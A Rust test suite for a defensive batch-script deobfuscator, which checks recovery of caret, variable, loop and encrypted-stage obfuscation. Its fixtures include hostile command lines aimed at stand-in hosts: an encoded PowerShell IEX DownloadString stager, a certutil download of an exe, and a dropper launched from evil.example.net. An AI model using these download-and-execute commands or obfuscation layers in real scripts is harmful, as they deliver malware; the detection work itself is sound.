#![allow(
    clippy::expect_used,
    clippy::unwrap_used,
    clippy::panic,
    clippy::missing_panics_doc
)]

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use disrobe_core::ioc::IocKind;
use disrobe_pass_shell::{
    BatchDeobReport, BatchIocKind, PayloadKind, StageMethod, deobfuscate_batch,
};

fn norm(s: &str) -> String {
    s.split_whitespace()
        .collect::<Vec<&str>>()
        .join(" ")
        .to_ascii_lowercase()
}

fn recovered(report: &BatchDeobReport, ground_truth_line: &str) -> bool {
    norm(&report.output).contains(&norm(ground_truth_line))
}

fn caret_obfuscate(line: &str) -> String {
    let mut out: String = String::new();
    for (i, c) in line.chars().enumerate() {
        if c.is_ascii_alphabetic() && i % 2 == 0 {
            out.push('^');
        }
        out.push(c);
    }
    out
}

#[test]
fn caret_escapes_recover_ground_truth() {
    let ground_truth: &str = "echo hello world";
    let obfuscated: String = format!("@echo off\n{}\n", caret_obfuscate(ground_truth));
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        recovered(&report, ground_truth),
        "caret recovery failed: {}",
        report.output
    );
    assert!(report.caret_escapes_removed > 0);
}

#[test]
fn line_continuation_recovers_single_command() {
    let ground_truth: &str = "echo alpha beta gamma";
    let obfuscated: &str = "@echo off\necho alpha ^\nbeta ^\ngamma\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(
        recovered(&report, ground_truth),
        "continuation recovery failed: {}",
        report.output
    );
    assert!(report.line_continuations_joined >= 2);
}

#[test]
fn set_indirection_recovers_command() {
    let ground_truth: &str = "whoami /priv";
    let obfuscated: &str = "@echo off\nset CMD=whoami /priv\n%CMD%\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
}

#[test]
fn delayed_expansion_char_split_recovers() {
    let ground_truth: &str = "echo hello";
    let obfuscated: &str = "@echo off\nsetlocal EnableDelayedExpansion\nset A=h\nset B=e\nset C=l\nset D=l\nset E=o\necho !A!!B!!C!!D!!E!\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
    assert!(report.delayed_expansions >= 5);
}

#[test]
fn substring_slicing_recovers_token() {
    let ground_truth: &str = "echo cmd";
    let obfuscated: &str = "@echo off\nset S=XXcmdYY\necho %S:~2,3%\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
    assert!(report.substring_expansions >= 1);
}

#[test]
fn substitution_replace_recovers_path() {
    let ground_truth: &str = r"c:\windows\system32";
    let obfuscated: &str = "@echo off\nset P=c:|windows|system32\necho %P:|=\\%\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
    assert!(report.substitution_expansions >= 1);
}

#[test]
fn set_a_arithmetic_folds_to_ground_truth() {
    let obfuscated: &str = "@echo off\nset /a PORT=4000+443\nset /a MASK=0xFF\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(report.output.contains("set PORT=4443"), "{}", report.output);
    assert!(report.output.contains("set MASK=255"), "{}", report.output);
    assert_eq!(report.arithmetic_folds, 2);
}

#[test]
fn for_f_token_cipher_recovers_command() {
    let ground_truth: &str = "echo hello world";
    let obfuscated: &str = "@echo off\nsetlocal EnableDelayedExpansion\nset \"P=hello world\"\nfor /F \"tokens=*\" %%A in (\"!P!\") do echo %%A\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
    assert_eq!(report.for_loops_unrolled, 1);
}

#[test]
fn for_l_loop_unrolls_to_ground_truth() {
    let obfuscated: &str = "@echo off\nfor /l %%i in (1,1,3) do echo step %%i\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    for line in ["echo step 1", "echo step 2", "echo step 3"] {
        assert!(
            recovered(&report, line),
            "missing {line}: {}",
            report.output
        );
    }
}

#[test]
fn if_constant_folding_keeps_taken_branch_only() {
    let obfuscated: &str = "@echo off\nset MODE=prod\nif \"%MODE%\"==\"prod\" (echo running prod) else (echo running dev)\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, "echo running prod"), "{}", report.output);
    assert!(
        !norm(&report.output).contains(&norm("echo running dev")),
        "dead else-branch must be eliminated: {}",
        report.output
    );
    assert!(report.if_branches_folded >= 1);
}

#[test]
fn if_constant_folding_drops_untaken_branch() {
    let obfuscated: &str = "@echo off\nset N=2\nif %N% geq 5 echo big\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(
        !norm(&report.output).contains(&norm("echo big")),
        "untaken branch must be dropped: {}",
        report.output
    );
    assert!(report.if_branches_folded >= 1);
}

#[test]
fn emulator_set_query_resolves_known_var() {
    let obfuscated: &str = "@echo off\nset TARGET=calc.exe\nset TARGET\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(
        report.output.contains("TARGET=calc.exe"),
        "set-query emulation failed: {}",
        report.output
    );
}

#[test]
fn embedded_powershell_encodedcommand_recovers_plaintext() {
    let inner: &str = "Write-Host malware-stage";
    let utf16: Vec<u8> = inner
        .encode_utf16()
        .flat_map(|u: u16| u.to_le_bytes())
        .collect();
    let b64: String = B64.encode(&utf16);
    let obfuscated: String = format!("@echo off\npowershell -nop -w hidden -enc {b64}\n");
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report
            .embedded_payloads
            .iter()
            .any(|p| p.kind == PayloadKind::PowerShell
                && p.content.contains("Write-Host malware-stage")),
        "encodedcommand not recovered: {:?}",
        report.embedded_payloads
    );
}

#[test]
fn embedded_powershell_concat_chain_reassembles() {
    let obfuscated: &str = "@echo off\npowershell -c \"'Inv'+'oke-'+'WebReq'+'uest'\"\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(
        report
            .embedded_payloads
            .iter()
            .any(|p| p.content.contains("Invoke-WebRequest")),
        "concat chain not reassembled: {:?}",
        report.embedded_payloads
    );
}

#[test]
fn base64_utf16_blob_decodes_to_url() {
    let inner: &str = "http://payload.example.com/stage2.bin";
    let utf16: Vec<u8> = inner
        .encode_utf16()
        .flat_map(|u: u16| u.to_le_bytes())
        .collect();
    let b64: String = B64.encode(&utf16);
    let obfuscated: String = format!("@echo off\nset BLOB={b64}\n");
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report
            .embedded_payloads
            .iter()
            .any(|p| p.kind == PayloadKind::Base64Utf16Le
                && p.content.contains("payload.example.com")),
        "utf16 blob not decoded: {:?}",
        report.embedded_payloads
    );
}

#[test]
fn multistage_xor_decrypts_with_literal_key() {
    let key: &[u8] = b"stagekey";
    let stage2: &str = "echo stage two http://c2.example.org/beacon";
    let cipher: Vec<u8> = stage2
        .bytes()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect();
    let b64: String = B64.encode(&cipher);
    let obfuscated: String = format!("@echo off\nset XORKEY=stagekey\nset PAYLOAD={b64}\n");
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report
            .decrypted_stages
            .iter()
            .any(|s| s.method == StageMethod::Xor && s.content.contains("c2.example.org")),
        "xor stage not recovered: {:?}",
        report.decrypted_stages
    );
}

#[test]
fn multistage_aes_cbc_decrypts_with_literal_key_iv() {
    use cipher::{BlockEncryptMut, KeyIvInit, block_padding::Pkcs7};
    let key: [u8; 16] = *b"0123456789ABCDEF";
    let iv: [u8; 16] = *b"FEDCBA9876543210";
    let stage2: &str = "start \\\\evil.example.net\\share\\dropper.exe";
    let mut buf: Vec<u8> = vec![0u8; stage2.len() + 16];
    let ct_len: usize = cbc::Encryptor::<aes::Aes128>::new_from_slices(&key, &iv)
        .expect("enc")
        .encrypt_padded_b2b_mut::<Pkcs7>(stage2.as_bytes(), &mut buf)
        .expect("pad")
        .len();
    buf.truncate(ct_len);
    let b64: String = B64.encode(&buf);
    let obfuscated: String =
        format!("@echo off\nset KEY=0123456789ABCDEF\nset IV=FEDCBA9876543210\nset DATA={b64}\n");
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report
            .decrypted_stages
            .iter()
            .any(|s| s.method == StageMethod::AesCbc && s.content.contains("dropper.exe")),
        "aes-cbc stage not recovered: {:?}",
        report.decrypted_stages
    );
}

#[test]
fn runtime_key_is_not_fabricated() {
    let stage2: &str = "echo this must never appear";
    let cipher: Vec<u8> = stage2.bytes().map(|b| b ^ 0x42).collect();
    let b64: String = B64.encode(&cipher);
    let obfuscated: String = format!("@echo off\nset /p USERKEY=Enter key: \nset PAYLOAD={b64}\n");
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report.decrypted_stages.is_empty(),
        "runtime key (set /p) must not be guessed; stages: {:?}",
        report.decrypted_stages
    );
    assert!(
        !report.output.contains("this must never appear"),
        "must not fabricate runtime-keyed plaintext"
    );
}

#[test]
fn iocs_surface_lolbas_and_url_from_ground_truth() {
    let ground_truth: &str =
        "certutil -urlcache -split -f http://malicious.example.com/a.exe a.exe";
    let obfuscated: &str = "@echo off\nset C=certutil\n%C% -urlcache -split -f http://malicious.example.com/a.exe a.exe\n";
    let report: BatchDeobReport = deobfuscate_batch(obfuscated, &[]);
    assert!(recovered(&report, ground_truth), "{}", report.output);
    assert!(
        report
            .iocs
            .batch
            .iter()
            .any(|i| i.kind == BatchIocKind::Lolbas && i.value == "certutil"),
        "lolbas not surfaced: {:?}",
        report.iocs.batch
    );
    assert!(
        report.iocs.core.iter().any(|i| i.kind == IocKind::Url),
        "url ioc not surfaced: {:?}",
        report.iocs.core
    );
}

#[test]
fn end_to_end_layered_sample_recovers_full_behavior() {
    let ground_truth_url: &str = "http://layered.example.com/final.ps1";
    let utf16: Vec<u8> =
        format!("IEX (New-Object Net.WebClient).DownloadString('{ground_truth_url}')")
            .encode_utf16()
            .flat_map(|u: u16| u.to_le_bytes())
            .collect();
    let b64: String = B64.encode(&utf16);
    let obfuscated: String = format!(
        "@e^cho off\nsetlocal EnableDelayedExpansion\nset P=p\nset S=owershell\nset /a N=1+0\nif !N! equ 1 (\n  !P!!S! -nop -w hidden -enc {b64}\n) else (\n  echo decoy\n)\n"
    );
    let report: BatchDeobReport = deobfuscate_batch(&obfuscated, &[]);
    assert!(
        report.caret_escapes_removed > 0,
        "carets: {}",
        report.output
    );
    assert!(report.if_branches_folded >= 1, "if: {}", report.output);
    assert!(
        !norm(&report.output).contains("echo decoy"),
        "decoy else-branch must be eliminated: {}",
        report.output
    );
    assert!(
        report
            .embedded_payloads
            .iter()
            .any(|p| p.content.contains("layered.example.com")),
        "final stage url not recovered: {:?}",
        report.embedded_payloads
    );
    assert!(
        report
            .iocs
            .batch
            .iter()
            .any(|i| i.kind == BatchIocKind::Lolbas && i.value == "powershell"),
        "powershell lolbas not flagged across stages: {:?}",
        report.iocs.batch
    );
}

fn read_corpus(relative: &str) -> String {
    let manifest_dir: std::path::PathBuf = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let workspace_root: &std::path::Path = manifest_dir
        .parent()
        .and_then(|p: &std::path::Path| p.parent())
        .expect("workspace root");
    let path: std::path::PathBuf = workspace_root.join("corpus").join("shell").join(relative);
    std::fs::read_to_string(&path)
        .unwrap_or_else(|e: std::io::Error| panic!("read {}: {e}", path.display()))
}

#[test]
fn corpus_seta_folds_documented_arithmetic() {
    let report: BatchDeobReport = deobfuscate_batch(&read_corpus("batch/seta/hello.bat"), &[]);
    assert!(report.output.contains("set PORT=4443"), "{}", report.output);
    assert!(report.output.contains("set SHIFT=8"), "{}", report.output);
    assert!(report.output.contains("set MASK=255"), "{}", report.output);
    assert!(
        recovered(&report, "echo connecting on port 4443 shift 8 mask 255"),
        "expanded echo not recovered: {}",
        report.output
    );
}

#[test]
fn corpus_iffold_keeps_prod_stage_drops_decoy() {
    let report: BatchDeobReport = deobfuscate_batch(&read_corpus("batch/iffold/hello.bat"), &[]);
    assert!(report.if_branches_folded >= 1, "{}", report.output);
    assert!(
        !norm(&report.output).contains("development decoy path"),
        "decoy branch must be eliminated: {}",
        report.output
    );
    assert!(
        report
            .embedded_payloads
            .iter()
            .any(|p| p.kind == PayloadKind::PowerShell
                && p.content.contains("staging.example.com")),
        "prod stage url not recovered: {:?}",
        report.embedded_payloads
    );
    assert!(
        report.iocs.core.iter().any(|i| i.kind == IocKind::Url),
        "stage url not surfaced as ioc: {:?}",
        report.iocs.core
    );
}

#[test]
fn corpus_multistage_xor_recovers_second_stage() {
    let report: BatchDeobReport =
        deobfuscate_batch(&read_corpus("batch/multistage/hello.bat"), &[]);
    assert!(
        report
            .decrypted_stages
            .iter()
            .any(|s| s.method == StageMethod::Xor && s.content.contains("second.example.org")),
        "xor second stage not recovered: {:?}",
        report.decrypted_stages
    );
    assert!(
        report.iocs.core.iter().any(|i| i.kind == IocKind::Url),
        "second-stage url not surfaced across layers: {:?}",
        report.iocs.core
    );
}
